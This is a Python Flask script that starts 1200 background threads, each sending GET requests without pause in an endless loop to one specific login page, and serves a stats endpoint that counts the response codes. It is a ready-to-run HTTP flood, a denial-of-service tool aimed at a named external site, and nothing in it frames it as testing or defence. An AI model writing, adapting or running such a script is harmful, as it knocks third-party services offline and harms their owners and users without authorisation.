from flask import Flask, jsonify
import requests
import threading
from bs4 import BeautifulSoup
from collections import defaultdict

app = Flask(__name__)
status_counts = defaultdict(int)
lock = threading.Lock()

def check(url):
    headers = {
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Retry-After': '5'
    }
    while True:
        try:
            response = requests.get(url, headers=headers)
            status_code = response.status_code
            soup = BeautifulSoup(response.text, "html.parser")
            title = soup.title.string if soup.title else "No Title"
            with lock:
                status_counts[status_code] += 1
            print(f"[{status_code}] {title} - {url}")
        except requests.exceptions.RequestException:
            with lock:
                status_counts['failed'] += 1
            print("Request failed")

def start_threads():
    target_url = "https://adminpanel.in.net/chito/login"
    for _ in range(1200):
        thread = threading.Thread(target=check, args=(target_url,))
        thread.daemon = True
        thread.start()

@app.route('/')
def home():
    return "Server is running with background threads!"

@app.route('/stats')
def stats():
    with lock:
        return jsonify(dict(status_counts))

if __name__ == '__main__':
    threading.Thread(target=start_threads, daemon=True).start()
    app.run(host='0.0.0.0', port=8000)
